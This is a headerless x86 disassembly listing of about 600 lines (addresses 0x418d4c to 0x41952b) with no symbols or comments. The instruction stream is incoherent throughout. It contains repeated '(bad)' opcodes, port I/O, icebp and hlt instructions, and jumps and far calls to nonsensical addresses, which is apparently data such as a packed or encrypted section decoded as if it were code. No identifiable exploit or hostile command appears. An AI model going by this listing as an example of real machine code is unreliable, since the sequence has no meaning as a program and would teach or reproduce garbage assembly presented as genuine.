  418d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d4d:	mov    DWORD PTR [ebx],ebp
  418d4f:	adc    eax,0xdc9d2dc0
  418d54:	inc    ecx
  418d55:	in     eax,dx
  418d56:	fucomp st(0)
  418d58:	ret    
  418d59:	call   0x19e4e096
  418d5e:	cmp    eax,0xcab8bd60
  418d63:	mov    ecx,0x42b44418
  418d68:	mov    dl,BYTE PTR [edi]
  418d6a:	mov    ebp,0x2d0efd62
  418d6f:	mov    cl,0xbb
  418d71:	mov    ecx,0x9686d35b
  418d76:	push   edx
  418d77:	ret    0xb82c
  418d7a:	fs in  al,0xd6
  418d7d:	fwait
  418d7e:	adc    ax,ax
  418d81:	xchg   edi,eax
  418d82:	mov    ch,0xa8
  418d84:	xor    DWORD PTR [ebx],0x69c82984
  418d8a:	and    ch,cl
  418d8c:	ret    
  418d8d:	cmp    DWORD PTR [edi],ecx
  418d8f:	xchg   esp,eax
  418d90:	(bad)  
  418d91:	loopne 0x418de6
  418d93:	ins    BYTE PTR es:[edi],dx
  418d94:	aam    0x2b
  418d96:	xlat   BYTE PTR ds:[ebx]
  418d97:	pusha  
  418d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d99:	lods   eax,DWORD PTR ds:[esi]
  418d9a:	pop    eax
  418d9b:	je     0x418d29
  418d9d:	leave  
  418d9e:	jmp    0x4b31dd78
  418da3:	rep movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  418da6:	adc    BYTE PTR [ebx+0x63892d93],cl
  418dac:	dec    ebx
  418dad:	ds aaa 
  418daf:	test   DWORD PTR [eax],ebx
  418db1:	mov    ds:0x5a4d542a,al
  418db6:	out    dx,eax
  418db7:	fbstp  TBYTE PTR [edx+0x7cc3e5f9]
  418dbd:	js     0x418d9b
  418dbf:	mov    esp,0x2cbd5805
  418dc4:	jmp    0x74f6:0xaf44236a
  418dcb:	mov    edx,0x598b1721
  418dd0:	dec    ebx
  418dd1:	cli    
  418dd2:	(bad)  
  418dd3:	mov    bl,0x9f
  418dd5:	jle    0x418ddd
  418dd7:	xlat   BYTE PTR ds:[ebx]
  418dd8:	nop
  418dd9:	jno    0x418e2f
  418ddb:	and    al,0x4d
  418ddd:	dec    edi
  418dde:	out    dx,al
  418ddf:	or     al,0xf8
  418de1:	call   0xa473:0x6ade5bd9
  418de8:	push   esi
  418de9:	jae    0x418e1b
  418deb:	ret    
  418dec:	fisub  DWORD PTR [ecx]
  418dee:	jnp    0x418e0d
  418df0:	mov    bh,0xfc
  418df2:	shl    DWORD PTR ds:0x636f762d,0xe1
  418df9:	jl     0x418dbf
  418dfb:	fadd   QWORD PTR [esp+edx*1+0x6b83a76c]
  418e02:	cdq    
  418e03:	bound  esp,QWORD PTR [esi-0x28]
  418e06:	nop
  418e07:	cmp    bl,ah
  418e09:	test   BYTE PTR [esi+0x6aff0f6b],ah
  418e0f:	in     eax,0x75
  418e11:	sahf   
  418e12:	xor    edx,DWORD PTR [ebx]
  418e14:	into   
  418e15:	jno    0x418dd9
  418e17:	and    eax,0x85329dac
  418e1c:	xor    ebp,DWORD PTR [eax+0x78]
  418e1f:	daa    
  418e20:	sub    ah,bh
  418e22:	pop    ebx
  418e23:	int3   
  418e24:	pushf  
  418e25:	dec    edx
  418e26:	jne    0x418e08
  418e28:	add    ebx,0xffffffa8
  418e2b:	je     0x418de1
  418e2d:	or     edx,DWORD PTR [esi-0x63]
  418e30:	rcl    BYTE PTR [edi],0x4c
  418e33:	icebp  
  418e34:	mov    esi,0x869db1ad
  418e39:	xchg   edx,eax
  418e3a:	loope  0x418e83
  418e3c:	neg    BYTE PTR [ecx]
  418e3e:	inc    eax
  418e3f:	div    DWORD PTR [ecx]
  418e41:	pop    esi
  418e42:	cdq    
  418e43:	sbb    ebx,DWORD PTR [edi-0x12]
  418e46:	mov    eax,0xd49533ca
  418e4b:	retf   0xa18f
  418e4e:	rcl    DWORD PTR [ecx+edi*2+0x3314c6e6],1
  418e55:	xor    DWORD PTR gs:[esi-0x36],0xffffffc7
  418e5a:	cmp    eax,0xe425c02d
  418e5f:	mov    esp,eax
  418e61:	mov    esi,gs
  418e63:	fwait
  418e64:	bsr    ebx,DWORD PTR [ecx]
  418e67:	jmp    0xabedc243
  418e6c:	jb     0x418dfa
  418e6e:	outs   dx,BYTE PTR ds:[esi]
  418e6f:	lahf   
  418e70:	jmp    0xe7fd:0x5b1a1949
  418e77:	pop    ds
  418e78:	imul   ebx,DWORD PTR [ecx],0x78a728de
  418e7e:	inc    ebp
  418e7f:	sbb    BYTE PTR [ebp-0x2e],dh
  418e82:	inc    esp
  418e83:	movs   DWORD PTR es:[di],DWORD PTR fs:[si]
  418e86:	xchg   BYTE PTR ds:[esi-0x28],bh
  418e8a:	mov    ebx,DWORD PTR [eax]
  418e8c:	cli    
  418e8d:	jp     0x418ecb
  418e8f:	mov    dh,0xc7
  418e91:	js     0x418ece
  418e93:	sub    eax,0xfeb14a3a
  418e98:	addr16 dec esp
  418e9a:	add    eax,0x4e09ac8a
  418e9f:	neg    DWORD PTR [edx+0x7b]
  418ea2:	cdq    
  418ea3:	loopne 0x418e30
  418ea5:	push   0x5345b692
  418eaa:	xchg   edi,eax
  418eab:	hlt    
  418eac:	mov    bh,0x4b
  418eae:	jp     0x418e52
  418eb0:	add    BYTE PTR [ebp-0x604cab9b],bl
  418eb6:	xlat   BYTE PTR ds:[ebx]
  418eb7:	add    ebp,DWORD PTR [esi+eax*2]
  418eba:	sub    eax,DWORD PTR [esi+0x46]
  418ebd:	adc    al,BYTE PTR [esi-0x5f]
  418ec0:	pop    ecx
  418ec1:	xor    eax,edx
  418ec3:	rcr    DWORD PTR [esp+ebx*8-0x4522d926],0xfe
  418ecb:	xor    eax,0xd3ae476b
  418ed0:	xchg   ecx,eax
  418ed1:	shl    esi,1
  418ed3:	in     eax,dx
  418ed4:	sub    bh,cl
  418ed6:	in     eax,0x12
  418ed8:	fimul  WORD PTR [esi-0x1ad399e1]
  418ede:	mov    al,ds:0xf614e790
  418ee3:	adc    ch,al
  418ee5:	es jl  0x418ee4
  418ee8:	mov    DWORD PTR [edx+0x38],ebx
  418eeb:	or     al,BYTE PTR [ecx]
  418eed:	xor    al,0xd0
  418eef:	icebp  
  418ef0:	in     eax,0x47
  418ef2:	jae    0x418f11
  418ef4:	pop    eax
  418ef5:	cmp    DWORD PTR [esi],0xffffffb4
  418ef8:	aaa    
  418ef9:	inc    eax
  418efa:	icebp  
  418efb:	jmp    0x8372c113
  418f00:	jge    0x418ec6
  418f02:	popa   
  418f03:	mov    BYTE PTR [ebx+eax*1],dh
  418f06:	adc    al,0xd7
  418f08:	fwait
  418f09:	pusha  
  418f0a:	shr    DWORD PTR [esi+ebx*4],0x32
  418f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f0f:	inc    ebx
  418f10:	add    al,0x5
  418f12:	repz rcl BYTE PTR [esi-0x7b],0x3c
  418f17:	add    al,0x5c
  418f19:	xor    ax,0xd2ee
  418f1d:	mov    bh,0xf7
  418f1f:	retf   
  418f20:	outs   dx,DWORD PTR ds:[esi]
  418f21:	cmp    al,0x7d
  418f23:	sub    ecx,esi
  418f25:	loope  0x418f97
  418f27:	cs ds inc ecx
  418f2a:	icebp  
  418f2b:	xchg   ecx,edi
  418f2d:	test   eax,0x255f065a
  418f32:	xor    BYTE PTR [edx+0x74],cl
  418f35:	test   DWORD PTR [edx],ebx
  418f37:	xchg   BYTE PTR [edi],dh
  418f39:	(bad)  
  418f3a:	mov    al,al
  418f3c:	mov    cl,0x9
  418f3e:	mov    BYTE PTR [ebp+0x12],al
  418f41:	cmp    BYTE PTR [edi],al
  418f43:	hlt    
  418f44:	jge    0x418f9c
  418f46:	hlt    
  418f47:	mov    eax,0x445860b
  418f4c:	cwde   
  418f4d:	addr16 aad 0x3b
  418f50:	mov    ecx,0x3654a78e
  418f55:	jnp    0x418f72
  418f57:	adc    DWORD PTR [ebp+0x49],edi
  418f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f5b:	in     al,0x18
  418f5d:	xor    BYTE PTR [esi+0x12543502],bl
  418f63:	cmp    al,0x29
  418f65:	mov    al,0xb1
  418f67:	test   eax,0xb341512d
  418f6c:	xor    bl,BYTE PTR [esi+eax*2]
  418f6f:	ins    BYTE PTR es:[edi],dx
  418f70:	sahf   
  418f71:	adc    esp,DWORD PTR [esi+0x1fbd0a6e]
  418f77:	out    0x98,eax
  418f79:	jae    0x418fba
  418f7b:	adc    esp,DWORD PTR [esi+0x6e]
  418f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f7f:	mov    ebp,0xeb00ebdd
  418f84:	mov    al,0x7d
  418f86:	les    edi,FWORD PTR ds:0xcd21ea81
  418f8c:	aaa    
  418f8d:	sub    BYTE PTR ds:0x57e443a0,ah
  418f93:	arpl   WORD PTR [ebp+0x48],cx
  418f96:	inc    esi
  418f97:	push   ecx
  418f98:	jecxz  0x418f80
  418f9a:	cdq    
  418f9b:	push   ebp
  418f9c:	xchg   DWORD PTR [edx+esi*8+0xac73983],eax
  418fa3:	cli    
  418fa4:	sub    ebp,DWORD PTR [eax]
  418fa6:	sbb    ch,0xd9
  418fa9:	mov    eax,0x2b2fab7b
  418fae:	aaa    
  418faf:	xchg   esi,eax
  418fb0:	ins    DWORD PTR es:[edi],dx
  418fb1:	jl     0x418fe9
  418fb3:	or     DWORD PTR [edi-0x64e80fb0],0xe23bb162
  418fbd:	adc    ah,BYTE PTR ds:0xd771fc2d
  418fc3:	pop    edi
  418fc4:	cmp    al,0x19
  418fc6:	xor    al,0x59
  418fc8:	out    0xa0,al
  418fca:	cld    
  418fcb:	cmp    ah,bh
  418fcd:	in     al,0xc3
  418fcf:	jb     0x418ff8
  418fd1:	arpl   WORD PTR [ebp+0x4a83c0da],si
  418fd7:	(bad)  
  418fd9:	and    eax,DWORD PTR [edi-0x614684ad]
  418fdf:	shl    ecx,cl
  418fe1:	ins    DWORD PTR es:[edi],dx
  418fe2:	(bad)  
  418fe3:	out    dx,eax
  418fe4:	leave  
  418fe5:	pop    ebp
  418fe6:	mov    edx,0x91b903ba
  418feb:	aad    0x6e
  418fed:	cmp    al,0x71
  418fef:	mov    ah,0xa
  418ff1:	mov    eax,ds:0x38708061
  418ff6:	sub    al,0xa7
  418ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ff9:	xchg   ah,dl
  418ffb:	gs daa 
  418ffd:	ja     0x41906f
  418fff:	pop    edi
  419000:	sbb    BYTE PTR [eax-0x39],0xcd
  419004:	or     DWORD PTR [edx-0xb74ba2],ebx
  41900a:	mov    ebp,0x836e4536
  41900f:	dec    eax
  419010:	lds    ebx,FWORD PTR [ebx+esi*2]
  419013:	cld    
  419014:	loopne 0x419007
  419016:	pop    es
  419017:	(bad)  
  419018:	push   edx
  419019:	imul   ebp,eax,0x3d07049d
  41901f:	popa   
  419020:	test   eax,0x53b1fa24
  419025:	aaa    
  419026:	inc    ebp
  419027:	cmc    
  419028:	lea    edx,[edx]
  41902a:	push   edx
  41902b:	and    DWORD PTR [edx-0x531e363],eax
  419031:	imul   esp,DWORD PTR [esi+0x47615a99],0xdd91c521
  41903b:	das    
  41903c:	push   0xffffff8c
  41903e:	sbb    BYTE PTR [esp-0x6cedc57d],bl
  419045:	fistp  QWORD PTR [ebx+ebx*2+0x8]
  419049:	in     eax,0xbf
  41904b:	mov    edi,0xe71ca45d
  419050:	sub    BYTE PTR [edx],ah
  419052:	add    eax,0x7cc294e6
  419057:	test   DWORD PTR [edx],ebp
  419059:	dec    ecx
  41905a:	into   
  41905b:	xchg   ebx,eax
  41905c:	out    dx,eax
  41905d:	fsubr  DWORD PTR [edx+0x39]
  419060:	int    0x4
  419062:	adc    bl,BYTE PTR [ebp+0x59c354c7]
  419068:	jae    0x4190bc
  41906a:	scas   eax,DWORD PTR es:[edi]
  41906b:	(bad)  
  41906c:	lods   al,BYTE PTR ds:[esi]
  41906d:	enter  0x81bb,0x3d
  419071:	jecxz  0x4190b0
  419073:	mov    esi,0x11fd782f
  419078:	repnz mov ch,0xe6
  41907b:	pop    edi
  41907c:	inc    esi
  41907d:	xor    eax,0xa4b1e6ee
  419082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419083:	jns    0x419034
  419085:	cli    
  419086:	repz jp 0x4190e2
  419089:	leave  
  41908a:	test   eax,0xfa6f9834
  41908f:	mov    cl,0x3f
  419091:	lea    eax,[edx]
  419093:	ins    BYTE PTR es:[edi],dx
  419094:	mov    ds:0x46b75519,al
  419099:	sbb    BYTE PTR [ebx],dl
  41909b:	call   0x1bf8:0x4b1220e
  4190a2:	repnz aas 
  4190a4:	retf   
  4190a5:	mov    bl,bl
  4190a7:	(bad)  
  4190a8:	fs ret 0x5822
  4190ac:	fsub   QWORD PTR ds:0xb79251b7
  4190b2:	push   edi
  4190b3:	jb     0x41907a
  4190b5:	or     BYTE PTR [ebp+0xc],0x6f
  4190b9:	fild   QWORD PTR [ecx-0x748acd5c]
  4190bf:	adc    ebx,eax
  4190c1:	sahf   
  4190c2:	push   ss
  4190c3:	repnz fcmovnu st,st(7)
  4190c6:	add    al,0x81
  4190c8:	sbb    eax,esp
  4190ca:	mov    ah,0xf4
  4190cc:	fs push esp
  4190ce:	out    dx,al
  4190cf:	and    DWORD PTR [esi-0x9],ebx
  4190d2:	jb     0x41911b
  4190d4:	mov    eax,0xa5251620
  4190d9:	mov    ds:0x7d294f0f,al
  4190de:	test   DWORD PTR [ecx],esp
  4190e0:	pop    ebp
  4190e1:	mov    dh,0xfe
  4190e3:	out    dx,eax
  4190e4:	out    0x63,al
  4190e6:	and    edx,DWORD PTR [ebp+0x12]
  4190e9:	lods   eax,DWORD PTR ds:[esi]
  4190ea:	outs   dx,BYTE PTR ds:[esi]
  4190eb:	xor    ch,BYTE PTR [edi-0x7a1a81d]
  4190f1:	into   
  4190f2:	fcomp  DWORD PTR [ebx]
  4190f4:	mov    bl,0xe2
  4190f6:	push   ebx
  4190f7:	es ins BYTE PTR es:[edi],dx
  4190f9:	test   al,0xe0
  4190fb:	mov    ch,0x87
  4190fd:	ins    DWORD PTR es:[edi],dx
  4190fe:	je     0x4190be
  419100:	jno    0x419135
  419102:	cs in  eax,0x98
  419105:	or     al,BYTE PTR [edi+0x25]
  419108:	add    ebx,0xfffffff1
  41910b:	xor    eax,0x513e3186
  419110:	div    DWORD PTR [ecx]
  419112:	in     eax,0x78
  419114:	mov    al,ds:0x5e9d1a58
  419119:	pop    ebx
  41911a:	mov    ebx,0x860c4647
  41911f:	mov    ebx,0x79f1307a
  419124:	rcr    BYTE PTR [esi],cl
  419126:	repz scas eax,DWORD PTR es:[edi]
  419128:	fs mov cl,0x23
  41912b:	pop    ebp
  41912c:	rcr    esp,0xb4
  41912f:	sbb    al,0x85
  419131:	jl     0x419165
  419133:	xor    DWORD PTR [edi+0x539b657a],ebx
  419139:	retf   
  41913a:	jnp    0x419142
  41913c:	retf   0xb220
  41913f:	ds scas eax,DWORD PTR es:[edi]
  419141:	ror    ecx,0xef
  419144:	bnd jmp 0xb10cbbdc
  41914a:	loop   0x4191b6
  41914c:	sub    ecx,edi
  41914e:	mov    edi,0xefc858d4
  419153:	jmp    0x4bce6371
  419158:	and    eax,0x13e142fa
  41915d:	dec    edi
  41915e:	repz imul edi,DWORD PTR [edx+0x3a58de5a],0xa1c1e634
  419169:	sbb    DWORD PTR [ebx+0x1c],0x55f6515b
  419170:	dec    ebx
  419171:	jo     0x419176
  419173:	test   eax,0x557e956e
  419179:	jmp    0x9b7a:0xdfbff707
  419180:	stos   BYTE PTR es:[edi],al
  419181:	(bad)  
  419182:	bound  ebx,QWORD PTR [ebp-0x73b88ef3]
  419188:	aaa    
  419189:	je     0x4191bb
  41918b:	jno    0x4191a6
  41918d:	(bad)  
  41918e:	mov    ds:0x928492ad,eax
  419193:	dec    edi
  419194:	xchg   esp,esp
  419196:	enter  0x708d,0x8b
  41919a:	cmp    ebx,DWORD PTR [ecx+0x72]
  41919d:	xor    al,0x18
  41919f:	vpmulhrsw xmm4{k3},xmm4,DWORD PTR [esi+0x40474c49]{1to4}
  4191a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191aa:	push   0xffffff99
  4191ac:	inc    eax
  4191ad:	mov    ch,0x63
  4191af:	es add dh,bh
  4191b2:	dec    edx
  4191b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191b4:	pop    es
  4191b5:	sti    
  4191b6:	fisub  WORD PTR [esi]
  4191b8:	lods   eax,DWORD PTR ds:[esi]
  4191b9:	sar    DWORD PTR [ebx+0x5a20d577],0x23
  4191c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191c1:	rol    ebx,1
  4191c3:	out    0xf4,al
  4191c5:	inc    ecx
  4191c6:	hlt    
  4191c7:	ins    DWORD PTR es:[edi],dx
  4191c8:	enter  0xed04,0x9f
  4191cc:	fldenv [eax-0x3e]
  4191cf:	jmp    0x7366c014
  4191d4:	ficomp DWORD PTR [ebp+0x524b611]
  4191da:	test   BYTE PTR [ebx+ebx*4],cl
  4191dd:	repz lahf 
  4191df:	aaa    
  4191e0:	in     eax,dx
  4191e1:	pop    esp
  4191e2:	adc    eax,0x312e641b
  4191e7:	call   0x4be4c363
  4191ec:	data16 test BYTE PTR ds:0x51149aff,0x82
  4191f4:	dec    ecx
  4191f5:	icebp  
  4191f6:	nop
  4191f7:	inc    ebp
  4191f8:	jnp    0x419238
  4191fa:	test   BYTE PTR ds:0xb71f76a3,0x96
  419201:	xchg   edi,edx
  419203:	cdq    
  419204:	dec    edx
  419205:	inc    ecx
  419206:	arpl   bp,ax
  419208:	pop    ss
  419209:	xchg   ebx,eax
  41920a:	xor    al,0x9b
  41920c:	push   ecx
  41920d:	test   eax,0xb6e3748c
  419212:	(bad)  
  419213:	jmp    0x419210
  419215:	aas    
  419216:	loop   0x419250
  419218:	neg    al
  41921a:	jne    0x41926c
  41921c:	nop
  41921d:	out    dx,al
  41921e:	into   
  41921f:	div    DWORD PTR [eax+0x59b5ba55]
  419225:	push   esp
  419226:	mov    ah,0x56
  419228:	inc    esp
  419229:	add    DWORD PTR [eax+0x13],esp
  41922c:	and    eax,0xb7242f20
  419231:	stos   DWORD PTR es:[edi],eax
  419232:	lock cmp ebp,DWORD PTR [edx+0x5f5366f2]
  419239:	or     esp,DWORD PTR [ecx-0x20e72361]
  41923f:	sbb    BYTE PTR [ecx],ah
  419241:	or     cl,BYTE PTR [eax]
  419243:	adc    esp,DWORD PTR [edx]
  419245:	xor    BYTE PTR [ecx],dh
  419247:	adc    ebx,0x8b4dee94
  41924d:	mov    eax,ds:0x4b3e35c5
  419252:	jp     0x4192b8
  419254:	ds xor eax,0x982ccb38
  41925a:	jbe    0x419295
  41925c:	nop
  41925d:	cmp    edi,DWORD PTR es:[edi-0x144dcef0]
  419264:	dec    edx
  419265:	out    0x27,al
  419267:	outs   dx,DWORD PTR ds:[esi]
  419268:	xor    esi,DWORD PTR [ecx-0x38]
  41926b:	mov    edx,0xf30a7b6e
  419270:	cdq    
  419271:	mov    al,ds:0x70d9d406
  419276:	pop    esi
  419277:	neg    DWORD PTR [edx]
  419279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41927a:	pushf  
  41927b:	xor    eax,DWORD PTR [edx]
  41927d:	xor    esi,DWORD PTR [edx-0x55]
  419280:	jge    0x4192d1
  419282:	inc    ebx
  419283:	inc    esp
  419284:	push   esi
  419285:	push   0xffffffbb
  419287:	inc    ebx
  419288:	arpl   WORD PTR [edx],di
  41928a:	jp     0x41927b
  41928c:	push   ds
  41928d:	in     al,dx
  41928e:	js     0x4192ed
  419290:	push   eax
  419291:	xchg   esp,eax
  419292:	in     ax,dx
  419294:	jae    0x419223
  419296:	xchg   ecx,eax
  419297:	or     esi,ebp
  419299:	adc    bl,bh
  41929b:	adc    al,0x9a
  41929d:	cli    
  41929e:	jmp    0x419247
  4192a0:	push   0x4f
  4192a2:	mov    ch,0x18
  4192a4:	push   ebp
  4192a5:	xchg   ebx,eax
  4192a6:	adc    bh,BYTE PTR [ecx-0x7624e413]
  4192ac:	sahf   
  4192ad:	sbb    al,0x18
  4192af:	cs jns 0x4192f5
  4192b2:	aas    
  4192b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192b4:	das    
  4192b5:	jp     0x41928b
  4192b7:	adc    ah,bh
  4192b9:	adc    cl,BYTE PTR [esi]
  4192bb:	jae    0x41932f
  4192bd:	out    0x71,al
  4192bf:	pop    ds
  4192c0:	fdivr  DWORD PTR [edx]
  4192c2:	jg     0x419323
  4192c4:	pop    ebp
  4192c5:	jns    0x419276
  4192c7:	mov    ecx,0xf26e57cf
  4192cc:	bound  eax,QWORD PTR [ecx-0x816443d]
  4192d2:	add    BYTE PTR [edi+ecx*4+0x12],dl
  4192d6:	sbb    edx,DWORD PTR ds:0x2ccff655
  4192dc:	pop    ds
  4192dd:	pop    ecx
  4192de:	mov    DWORD PTR [edx],edi
  4192e0:	jb     0x41935a
  4192e2:	enterw 0xb9a1,0x12
  4192e7:	jae    0x419270
  4192e9:	mov    ch,0xc7
  4192eb:	jecxz  0x419291
  4192ed:	jae    0x419349
  4192ef:	aad    0x79
  4192f1:	les    esi,FWORD PTR [edi]
  4192f3:	dec    eax
  4192f4:	jae    0x419288
  4192f6:	mov    dh,0x1a
  4192f8:	cwde   
  4192f9:	sbb    eax,0xc1813884
  4192fe:	ret    
  4192ff:	or     BYTE PTR [edx-0x3b],0x71
  419303:	jmp    0x795b24c8
  419308:	scas   al,BYTE PTR es:[edi]
  419309:	pop    esi
  41930a:	loope  0x41931b
  41930c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41930d:	stos   DWORD PTR es:[edi],eax
  41930e:	rcl    BYTE PTR [esi-0xb],0x96
  419312:	or     eax,0xfb9fc941
  419317:	ror    DWORD PTR [ecx-0x4d6f8c61],1
  41931d:	(bad)  [eax-0x4c]
  419320:	ja     0x4192d9
  419322:	pop    esi
  419323:	pushf  
  419324:	dec    esp
  419325:	das    
  419326:	jae    0x419381
  419328:	pop    edi
  419329:	lds    edx,FWORD PTR [ecx-0x6d0ff694]
  41932f:	cmp    al,0x3f
  419331:	xor    eax,esp
  419333:	dec    eax
  419334:	out    dx,al
  419335:	std    
  419336:	(bad)  
  419337:	jns    0x419365
  419339:	and    DWORD PTR [ebp-0x225a92d5],0xffffff9d
  419340:	out    0x7e,al
  419342:	pop    esi
  419343:	mov    bh,0xc6
  419345:	push   ebx
  419346:	test   BYTE PTR [ecx-0x73],bh
  419349:	dec    esi
  41934a:	jmp    DWORD PTR [ecx+0x61123061]
  419350:	sbb    al,0xa5
  419352:	dec    ecx
  419353:	xchg   DWORD PTR [edx-0x23],ecx
  419356:	mov    WORD PTR [ebp+0x37f2dbf4],es
  41935c:	aaa    
  41935d:	fist   DWORD PTR [ebx+0x62783213]
  419363:	pop    edi
  419364:	and    DWORD PTR [esi+0x78],esi
  419367:	js     0x419395
  419369:	iret   
  41936a:	nop
  41936b:	or     eax,0x50cc22fd
  419370:	pop    esp
  419371:	jns    0x4193dd
  419373:	cmp    BYTE PTR [esi+0x3912019f],cl
  419379:	lods   eax,DWORD PTR ds:[esi]
  41937a:	dec    ecx
  41937b:	aas    
  41937c:	popf   
  41937d:	sahf   
  41937e:	adc    dl,BYTE PTR [ebp+0x65062e14]
  419384:	repnz outs dx,DWORD PTR ds:[esi]
  419386:	adc    esi,ebx
  419388:	mov    ebx,0xdd7992e4
  41938d:	sbb    dh,ch
  41938f:	daa    
  419390:	icebp  
  419391:	xor    edi,DWORD PTR [ebx-0x5d]
  419394:	sbb    ch,BYTE PTR [edx]
  419396:	cld    
  419397:	fistp  DWORD PTR [ecx-0x4f]
  41939a:	xor    eax,DWORD PTR [esi-0x2c4a2bb2]
  4193a0:	xchg   ebp,eax
  4193a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193a2:	mov    DWORD PTR [ebx+0x5d],ebx
  4193a5:	fnstcw WORD PTR [eax]
  4193a7:	loopne 0x4193f9
  4193a9:	mov    al,0x72
  4193ab:	lds    esp,FWORD PTR [ebp+0x61f1902f]
  4193b1:	xchg   BYTE PTR [eax-0x3b],dl
  4193b4:	sbb    BYTE PTR [ecx],bh
  4193b6:	frstor [edi+0x67e26309]
  4193bc:	jae    0x419369
  4193be:	outs   dx,BYTE PTR ds:[esi]
  4193bf:	push   ecx
  4193c0:	cs (bad) 
  4193c2:	mov    edi,0x970760a6
  4193c7:	popfw  
  4193c9:	loopne 0x41941c
  4193cb:	mov    esi,0x8c366f78
  4193d0:	mov    eax,ds:0x21fe7417
  4193d5:	std    
  4193d6:	push   esp
  4193d7:	mov    bl,0x6
  4193d9:	xchg   edi,eax
  4193da:	sbb    dh,BYTE PTR [ecx-0x7e]
  4193dd:	mov    cl,bl
  4193df:	add    BYTE PTR [eax-0x77734424],bh
  4193e5:	and    cl,BYTE PTR [edx]
  4193e7:	push   ds
  4193e8:	rcl    dh,0x5e
  4193eb:	and    esp,DWORD PTR [eax]
  4193ed:	push   edi
  4193ee:	out    dx,al
  4193ef:	jb     0x419389
  4193f1:	scas   al,BYTE PTR es:[edi]
  4193f2:	mov    ebx,0xc90a50cd
  4193f7:	pop    esi
  4193f8:	pushf  
  4193f9:	es std 
  4193fb:	mov    edi,0x364cd4a2
  419400:	retf   0x261c
  419403:	jnp    0x41938f
  419405:	push   edi
  419406:	pop    es
  419407:	ds shr ah,1
  41940a:	inc    ebx
  41940b:	jl     0x419404
  41940d:	repz or esp,DWORD PTR [ebp-0x75153342]
  419414:	mov    eax,DWORD PTR [ebx-0x3b7bd8fc]
  41941a:	adc    eax,0x21ffc5e0
  41941f:	imul   edx,DWORD PTR [ebx],0x5a
  419422:	aaa    
  419423:	sub    al,0xf1
  419425:	addr16 pushf 
  419427:	retf   0xa9d0
  41942a:	cs cmp eax,0x4e2c266c
  419430:	retf   
  419431:	shl    BYTE PTR [eax-0x4c],0x5a
  419435:	aas    
  419436:	and    esi,DWORD PTR [ecx-0x2d]
  419439:	popf   
  41943a:	push   ebp
  41943b:	loopne 0x41948d
  41943d:	add    al,0x44
  41943f:	(bad)  
  419440:	sahf   
  419441:	xchg   BYTE PTR [esi+esi*1+0x41],bh
  419445:	leave  
  419446:	inc    esp
  419447:	data16 std 
  419449:	imul   ebp,DWORD PTR [ebx-0x328703a],0xb4322848
  419453:	dec    ebx
  419454:	ds popf 
  419456:	xor    bh,BYTE PTR [ebp-0x3c]
  419459:	adc    eax,0xdfb41c5a
  41945e:	leave  
  41945f:	lock fild QWORD PTR [esi-0x1fe0223]
  419466:	xor    BYTE PTR [esi-0x4d],ah
  419469:	lds    eax,FWORD PTR [edx+0x56]
  41946c:	push   eax
  41946d:	hlt    
  41946e:	add    eax,0x836f79b6
  419473:	or     ah,bh
  419475:	scas   eax,DWORD PTR es:[edi]
  419476:	cld    
  419477:	sti    
  419478:	pusha  
  419479:	enter  0x5401,0xbc
  41947d:	imul   eax,DWORD PTR ss:[ebp-0x4a43e2a9],0xea070e9e
  419488:	arpl   WORD PTR [edi+0x224f73ac],sp
  41948e:	fmul   st,st(4)
  419490:	in     al,0xb3
  419492:	push   edx
  419493:	iret   
  419494:	sub    DWORD PTR [ecx-0x69],ecx
  419497:	clc    
  419498:	je     0x419431
  41949a:	cdq    
  41949b:	data16 jb 0x41949c
  41949e:	dec    ebx
  41949f:	sti    
  4194a0:	sbb    eax,0x9a755de1
  4194a5:	stos   DWORD PTR es:[edi],eax
  4194a6:	push   ds
  4194a7:	push   ebp
  4194a8:	mov    bh,0x1b
  4194aa:	out    0x15,eax
  4194ac:	into   
  4194ad:	jp     0x419450
  4194af:	sti    
  4194b0:	sub    al,0x3c
  4194b2:	dec    edx
  4194b3:	jle    0x419454
  4194b5:	mov    edi,DWORD PTR [ebx]
  4194b7:	and    DWORD PTR [ebp+0x1a8b3213],0x702df376
  4194c1:	ss add eax,0xba847681
  4194c7:	test   ecx,eax
  4194c9:	and    ebx,DWORD PTR [eax+esi*2+0x1]
  4194cd:	sbb    cl,dl
  4194cf:	dec    esp
  4194d0:	es rcr dh,0x12
  4194d4:	in     al,0x59
  4194d6:	shr    DWORD PTR [esi-0x4c1a6c46],cl
  4194dc:	retf   
  4194dd:	cwde   
  4194de:	sti    
  4194df:	sbb    al,BYTE PTR [ebx]
  4194e1:	cmp    BYTE PTR [esi+edx*2],0xc0
  4194e5:	xchg   DWORD PTR [ebx+0x601a6e0b],edx
  4194eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194ec:	sbb    dh,BYTE PTR [esi-0x9]
  4194ef:	xor    eax,0xdc49784c
  4194f4:	dec    eax
  4194f5:	call   0xe490ce74
  4194fa:	and    BYTE PTR [eax],0xbd
  4194fd:	or     eax,0xce5cf3a1
  419502:	sbb    DWORD PTR [eax-0x2f6a7b4b],eax
  419508:	les    edi,FWORD PTR [ecx]
  41950a:	inc    esi
  41950b:	dec    ecx
  41950c:	xchg   edi,eax
  41950d:	jg     0x41951c
  41950f:	jp     0x419582
  419511:	adc    al,0x59
  419513:	out    dx,eax
  419514:	xor    ebp,DWORD PTR [ebx+0x58]
  419517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419518:	aaa    
  419519:	bound  edi,QWORD PTR ds:0xdedf477e
  41951f:	mov    ecx,0xd43446d6
  419524:	mov    ds:0x84442b31,eax
  419529:	mov    ah,0x87
  41952b:	xchg   BYTE PTR [esi-0x6a],dh
